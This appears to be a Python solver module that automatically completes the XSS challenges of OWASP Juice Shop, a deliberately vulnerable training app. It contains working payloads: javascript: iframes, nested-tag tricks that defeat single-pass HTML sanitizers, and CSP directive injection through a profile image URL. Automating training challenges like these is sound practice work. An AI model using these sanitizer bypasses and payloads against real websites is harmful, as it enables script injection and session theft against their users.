"""XSS category solvers (8 of 9 — videoXssChallenge needs the Arbitrary File
Write exploit first and is solved alongside Vulnerable Components in a later
phase). Verified against models/user.ts, models/product.ts, models/feedback.ts,
routes/trackOrder.ts, routes/saveLoginIp.ts, routes/userProfile.ts,
routes/updateUserProfile.ts, routes/profileImageUrlUpload.ts and
lib/startup/registerWebsocketEvents.ts (fetched 2026-08-09). All but two of
these are solved with pure HTTP requests — no browser needed, because Juice
Shop's server-side "solved" checks look at the raw data it received, not at
whether a script actually executed in a browser."""
import time
import uuid

import socketio

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"
IFRAME_PAYLOAD = '<iframe src="javascript:alert(`xss`)">'


# --- models/product.ts description setter: solved the instant a product's
# description (set via any API call, e.g. PUT /api/Products/:id) contains the
# payload — the challenge is literally named "API-only". ---

@register("restfulXssChallenge", "XSS", 3)
def solve_restful_xss(ctx: SolverContext) -> None:
    email = f"xss.rest.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    resp = ctx.client.get("/rest/products/search", params={"q": ""})
    resp.raise_for_status()
    products = resp.json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(f"/api/Products/{product_id}", json={"description": IFRAME_PAYLOAD}).raise_for_status()


# --- models/feedback.ts comment setter: sanitize-html's default allowedTags
# has no entry for <iframe> (or any tag capable of running javascript:), so
# the literal IFRAME_PAYLOAD alone gets stripped to "". The real hole is that
# sanitizeHtml() runs only ONCE (not recursively, unlike sanitizeSecure()):
# nesting a <script> tag inside a fake "<<script>...</script>iframe ...>"
# opening bracket means removing the inner <script>...</script> in a single
# pass unmasks a brand-new, unsanitized <iframe src="javascript:...">.
# routes/captcha.ts also requires a fresh captchaId + evaluated expression on
# every /api/Feedbacks POST (verifyCaptcha middleware). ---

MASKED_IFRAME_PAYLOAD = "<<script>Foo</script>iframe src=\"javascript:alert(`xss`)\">"


@register("persistedXssFeedbackChallenge", "XSS", 4)
def solve_persisted_xss_feedback(ctx: SolverContext) -> None:
    captcha_resp = ctx.client.get("/rest/captcha")
    captcha_resp.raise_for_status()
    captcha = captcha_resp.json()
    ctx.client.post(
        "/api/Feedbacks",
        json={
            "comment": MASKED_IFRAME_PAYLOAD,
            "rating": 1,
            "captchaId": captcha["captchaId"],
            "captcha": captcha["answer"],
        },
    ).raise_for_status()


# --- models/user.ts email setter: while persistedXssUserChallenge is
# unsolved, the EMAIL field (not username) is checked verbatim for the
# payload on any user create. Registering directly via the API bypasses the
# frontend's client-side email format validation. ---

@register("persistedXssUserChallenge", "XSS", 3)
def solve_persisted_xss_user(ctx: SolverContext) -> None:
    email = f'{IFRAME_PAYLOAD}.{uuid.uuid4().hex[:8]}@{DOMAIN}'
    ctx.client.register(email, "Test1234!")


# --- routes/trackOrder.ts: reflectedXssChallenge is solved purely if the
# `:id` path segment contains the payload — a plain GET, no order needs to
# exist. ---

@register("reflectedXssChallenge", "XSS", 2)
def solve_reflected_xss(ctx: SolverContext) -> None:
    ctx.client.get(f"/rest/track-order/{IFRAME_PAYLOAD}")


# --- routes/saveLoginIp.ts: solved if the `True-Client-Ip` request header is
# literally the payload string when calling GET /rest/saveLoginIp while
# authenticated. ---

@register("httpHeaderXssChallenge", "XSS", 4)
def solve_http_header_xss(ctx: SolverContext) -> None:
    email = f"xss.hdr.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.get("/rest/saveLoginIp", headers={"True-Client-Ip": IFRAME_PAYLOAD}).raise_for_status()


# --- lib/startup/registerWebsocketEvents.ts: localXssChallenge and
# xssBonusChallenge are solved purely by emitting a `verifyLocalXssChallenge`
# Socket.IO event with the right payload string — the frontend does this
# whenever the product search box changes, so we can just do it directly. ---

XSS_BONUS_PAYLOAD = (
    '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" '
    'src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'
    '&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true'
    '&show_reposts=false&show_teaser=true"></iframe>'
)


def _emit_verify_local_xss(base_url: str, payload: str) -> None:
    sio = socketio.SimpleClient()
    sio.connect(base_url, transports=["websocket"])
    try:
        sio.emit("verifyLocalXssChallenge", payload)
        time.sleep(1)
    finally:
        sio.disconnect()


@register("localXssChallenge", "XSS", 1)
def solve_local_xss(ctx: SolverContext) -> None:
    _emit_verify_local_xss(ctx.base_url, IFRAME_PAYLOAD)


@register("xssBonusChallenge", "XSS", 1)
def solve_xss_bonus(ctx: SolverContext) -> None:
    _emit_verify_local_xss(ctx.base_url, XSS_BONUS_PAYLOAD)


# --- routes/userProfile.ts CSP header is built as
# `img-src 'self' ${user.profileImage}; script-src 'self' 'unsafe-eval'` with
# no encoding, so a profileImage value containing "; script-src
# 'unsafe-inline'" injects that directive. The username must ALSO literally
# equal "<script>alert(`xss`)</script>", but models/user.ts always runs
# security.sanitizeLegacy() on username (gated on persistedXssUserChallenge's
# *environment* enablement, not its solved status, so it can't be avoided).
# sanitizeLegacy's single-pass regex (`/<(?:\w+)\W+?[\w]/gi`) always strips a
# literal "<script>a" wherever it appears — so the target string is not even
# a fixed point of its own sanitizer. Masking a decoy match right after the
# opening "<" (which gets deleted whole) fuses the surrounding characters
# back into an intact "<script>...</script>" that never existed contiguously
# in the original input, so it was never itself a match candidate. Both
# /profile and /profile/image/url authenticate via the `token` cookie, which
# core.client.JuiceShopClient._set_token already sets on login. ---

MASKED_SCRIPT_USERNAME = "<<a>ascript>alert(`xss`)</script>"


@register("usernameXssChallenge", "XSS", 4)
def solve_username_xss(ctx: SolverContext) -> None:
    email = f"xss.csp.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/profile/image/url",
        data={"imageUrl": "https://x.invalid/pic.jpg; script-src 'unsafe-inline'"},
    )
    ctx.client.post("/profile", data={"username": MASKED_SCRIPT_USERNAME}).raise_for_status()
    ctx.client.get("/profile").raise_for_status()
